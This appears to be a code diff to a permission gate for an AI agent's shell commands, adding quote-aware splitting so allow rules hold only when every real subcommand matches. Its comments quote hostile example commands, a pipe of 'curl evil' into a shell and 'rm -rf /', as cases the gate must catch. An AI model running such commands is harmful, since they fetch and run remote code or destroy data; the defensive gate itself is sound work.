@@ -108,11 +108,40 @@ function stripRedirects(cmd: string): string {
  * start a new subcommand, and a rule must match subcommands on its own. Redirection is removed first — it is not
  * a separator — after its targets were collected for path matching.
  *
- * Known limit, stated rather than hidden: a separator quoted as data (`echo "a; b"`) still splits, same as any
- * simple splitter; a rule scoped to `echo *` with class allow then does not allow it (the safe direction).
+ * This reading is for deny and ask: it also splits a separator quoted as data (`echo "x; rm -rf /"`), the safe
+ * direction for a rule that stops things. An allow is judged on `allowSubcommands`, which splits as the shell does.
  */
 export function splitCommand(cmd: string): string[] {
   return stripRedirects(cmd).split(/&&|\|\||[;|&\n\r]+/).map((s) => s.trim()).filter(Boolean);
+}
+
+/**
+ * The subcommands an ALLOW is judged on: split only where the shell splits, outside quotes ('…' is literal, "…"
+ * honours \ escapes), so `echo "a; b"` is one command. Undefined — and no allow can hold — when the line runs code
+ * inside an argument (`$(…)`, backticks, `<(…)`, `>(…)` outside single quotes) or a quote is left open: what the
+ * shell would run there is not what the rule was written for. Deny and ask keep `splitCommand`'s wider reading.
+ */
+export function allowSubcommands(cmd: string): string[] | undefined {
+  const subs: string[] = [];
+  let cur = '';
+  let q: '"' | "'" | null = null;
+  for (let i = 0; i < cmd.length; i++) {
+    const c = cmd[i]!;
+    if (q === "'") { cur += c; if (c === "'") q = null; continue; }
+    if (c === '\\' && i + 1 < cmd.length) { cur += c + cmd[++i]; continue; }
+    if (c === '`' || ((c === '$' || c === '<' || c === '>') && cmd[i + 1] === '(')) return undefined;
+    if (q === '"') { cur += c; if (c === '"') q = null; continue; }
+    if (c === '"' || c === "'") { q = c; cur += c; continue; }
+    const two = cmd.slice(i, i + 2);
+    // `2>&1`, `>&2` and `&>` are redirects, not the background separator
+    const redirectAmp = c === '&' && (cur.endsWith('>') || cur.endsWith('<') || cmd[i + 1] === '>');
+    if (two === '&&' || two === '||') { subs.push(cur); cur = ''; i++; continue; }
+    if (!redirectAmp && ';|&\n\r'.includes(c)) { subs.push(cur); cur = ''; continue; }
+    cur += c;
+  }
+  if (q) return undefined;
+  subs.push(cur);
+  return subs.map((s) => stripRedirects(s).trim()).filter(Boolean);
 }
 
 /**
@@ -209,8 +238,8 @@ function patternForms(pattern: string): string[] {
  * holds when EVERY subcommand matches as written (an allow for `git *` must not approve `git push && curl evil | sh`,
  * and an allow for `rm -rf build` must not approve `sudo rm -rf build`) — Claude Code's own rule.
  */
-function commandsMatch(patterns: readonly string[], subs: readonly string[], then: GateVerdict): boolean {
-  if (then === 'allow') return subs.length > 0 && subs.every((s) => patterns.some((p) => cmdMatches(p, s)));
+function commandsMatch(patterns: readonly string[], subs: readonly string[], then: GateVerdict, allowSubs: readonly string[] | undefined): boolean {
+  if (then === 'allow') return !!allowSubs && allowSubs.length > 0 && allowSubs.every((s) => patterns.some((p) => cmdMatches(p, s)));
   const res = patterns.flatMap(patternForms).map((p) => globRe(p));
   return subs.some((s) => denyForms(s).some((f) => res.some((re) => re.test(f))));
 }
@@ -341,6 +370,7 @@ export function whenMatches(when: GateWhen, c: GateCall): boolean {
 export function decideGate(input: GateCall, rules: readonly GateRule[], mode: ApprovalMode, capped: boolean): GateDecision {
   const cmd = typeof input.input?.command === 'string' ? input.input.command : undefined;
   const subs = cmd && cmd.trim() ? splitCommand(cmd) : undefined;
+  const allowSubs = cmd && cmd.trim() ? allowSubcommands(cmd) : undefined;
   const candidates = pathCandidates(input);
   const call: GateCall = { ...input, ctx: { roomHop: false, tainted: false, connectorData: false, capped, ...input.ctx } };
 
@@ -350,7 +380,7 @@ export function decideGate(input: GateCall, rules: readonly GateRule[], mode: Ap
     if (!whenMatches(r.when, call)) continue;
     // Command scoping is class-aware (any-subcommand for deny/ask, every-subcommand for allow); paths are the
     // same for every class. Both live here, not in whenMatches, because they need the rule's class.
-    if (r.when.commands?.length && (!subs || !commandsMatch(r.when.commands, subs, r.then))) continue;
+    if (r.when.commands?.length && (!subs || !commandsMatch(r.when.commands, subs, r.then, allowSubs))) continue;
     if ((r.when.paths?.length || r.when.exceptPaths?.length) && !pathsMatch(r.when, candidates, input.cwd ?? '', r.then)) continue;
     matched.push(r);
   }
